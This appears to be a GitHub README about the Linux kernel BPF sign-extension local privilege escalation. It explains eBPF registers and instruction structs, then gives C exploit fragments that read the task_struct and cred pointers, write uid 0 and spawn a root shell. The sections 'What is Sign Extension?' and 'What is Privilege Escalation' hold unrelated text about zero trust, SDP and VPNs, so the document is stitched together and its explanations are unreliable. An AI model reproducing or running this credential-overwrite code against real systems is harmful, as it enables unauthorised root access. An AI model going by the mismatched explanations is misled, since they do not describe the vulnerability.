# Linux Kernel - BPF Sign Extension Local Privilege Escalation

![alt text](https://github.com/samaleyadeh/images/blob/master/DY42GCGV4AA1_8F.jpg) 


## What is BpF?
Software defined perimeter [SDP](https://sdn.ieee.org/newsletter/march-2017/software-defined-perimeters-an-architectural-view-of-sdp)

As you may know, the user layer and kernel layer of Linux are isolated. If you want the kernel to execute the user's code, you need to write the kernel module which can only be loaded by the root user. The BPF (Berkeley Packet Filter) provides a bridge between code and data transfer between the user and the kernel. The user can use the eBPF instruction bytecode to deliver code to the kernel, and trigger the kernel to execute the user-provided code through events (such as writing data to the socket), and share the data with the kernel in the form of map (key - value). The user layer writes data to the map, and the kernel layer fetches data from the map, and vice versa. 
The original intention of BPF is to filter the network at the bottom, and later it can easily inject code into the kernel. It is widely used for packet capture, kernel probe, Performance monitoring and other fields. 
eBPF virtual instruction system
The eBPF virtual instruction system belongs to Reduced Instruction Set Computer (RISC) and has 10 64-bit virtual registers, r0-r10. r0 stores the return value, r1 to r5 is reserved for arguments, r6 to r9 is reserved for storing callee saved registers and r10 stores read-only frame pointer. In actual operation, the virtual machine corresponds these 10 registers to the 10 physical registers of the hardware CPU: R0 - rax, R1 - rdi , R2 - rsi , R3 - rdx , R4 - rcx , R5 - r8 , R6 - rbx , R7 - r13 , R8 - r14 , R9 - r15 , R10 – rbp(frame pointer).
Each BPF instruction on x64 platform is of 64-bit long. The format of each instruction is as follows:

![alt text](://github.com/samaleyadeh/images/blob/master/zero-day-attack-1024x413.jpg) 


## What is Sign Extension?

![alt text](https://github.com/LiYangHart/SDP_images/blob/master/ZeroTrust%20arch.jpg) 

Conventional security models operate on the outdated assumption that everything on the inside of an organization’s network can be trusted, but given increased attack sophistication and insider threats, new security measures needed to be taken to stop them from spreading once inside. Introducing the concept of [Zero Trust](https://www.paloaltonetworks.com/cyberpedia/what-is-a-zero-trust-architecture) a new movment that introduced SDP as one of the solutions.

## What is Privilege Escalation

![alt text](https://github.com/LiYangHart/SDP_images/blob/master/WhySDP-01.png.pagespeed.ce.iEcF-GmSgR.png) 
Enterprises have long relied on virtual private networks (VPNs) to connect mobile or remote users to applications and other network resources. But, traditional VPNs are poorly suited for the shift to IaaS and SaaS. They rely on appliances, such as firewalls or VPN concentrators, binding mobile users to specific locations. Such an architecture adds latency and creates a chokepoint for cloud access. And, to even reach the VPN gateways, users must rely on the unpredictable Internet. Once connected through a VPN, users are trusted with access to all resources on the network, increasing the risk of malware propagation and data breach. Overall, legacy VPN architectures expose enterprise to attacks and adversely impact the user experience, especially when accessing cloud applications.




```C
Struct bpf_insn { 
    __u8 code;         /* opcode */ 
    __u8 dst_reg: 4 ;     /* dest register */ 
    __u8 src_reg: 4 ;     /* source register */ 
    __s16 off;         /* signed offset */ 
    __s32 imm;         /* signed immediate constant */ 
};
```





```C

#define BPF_MOV32_IMM(DST, IMM) \ 
    (( struct bpf_insn) { \ 
        .code   = BPF_ALU | BPF_MOV | BPF_K, \ 
        .dst_reg = DST, \ 
        .src_reg = 0 , \ 
        .off    = 0 , \ 
        .imm    = IMM })

```


```C
uint64_t fp, sp, task_struct, credptr, uidptr;

	fp = __get_fp();
	if (fp < PHYS_OFFSET)
		__exit("bogus fp");
	
	sp = get_sp(fp);
	if (sp < PHYS_OFFSET)
		__exit("bogus sp");
	
	task_struct = __read(sp);

	if (task_struct < PHYS_OFFSET)
		__exit("bogus task ptr");

	printf("task_struct = %lx\n", task_struct);
```


```C
	credptr = __read(task_struct + CRED_OFFSET); // cred

	if (credptr < PHYS_OFFSET)
		__exit("bogus cred ptr");

	uidptr = credptr + UID_OFFSET; // uid
	if (uidptr < PHYS_OFFSET)
		__exit("bogus uid ptr");

	printf("uidptr = %lx\n", uidptr);
	__write(uidptr, 0); // set both uid and gid to 0

	if (getuid() == 0) {
		printf("spawning root shell\n");
		system("/bin/bash");
		exit(0);
	}

	__exit("not vulnerable?");
}
```






